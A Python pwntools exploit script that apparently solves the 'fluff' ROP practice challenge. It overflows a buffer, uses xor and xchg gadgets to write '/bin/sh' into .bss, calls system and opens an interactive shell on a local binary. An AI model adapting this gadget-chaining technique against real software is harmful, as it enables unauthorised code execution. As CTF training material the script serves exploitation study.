#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

null = p64(0x0)

rop = cyclic(40)
rop += p64(0x400822)            # xor r11, r11; pop r14; mov edi, 0x601050; ret
rop += null
rop += p64(0x400832)            # pop r12; mov r13d, 0x604060; ret
rop += p64(0x601060)            # .bss
rop += p64(0x40082f)            # xor r11, r12; pop r12; mov r13d, 0x604060; ret
rop += '/bin/sh\x00'
rop += p64(0x400840)            # xchg r11, r10; pop r15; mov r11d, 0x602050; ret
rop += null                     # now r10 points to .bss
rop += p64(0x400822)            # xor r11, r11; pop r14; mov edi, 0x601050; ret
rop += null
rop += p64(0x40082f)            # xor r11, r12; pop r12; mov r13d, 0x604060; ret
rop += null
rop += p64(0x40084e)            # mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret
rop += null * 2
rop += p64(0x4008c3)            # pop rdi; ret
rop += p64(0x601060)            # .bss ['/bin/sh\x00']
rop += p64(0x400810)            # system

p = process('./fluff')
p.sendline(rop)
p.interactive()
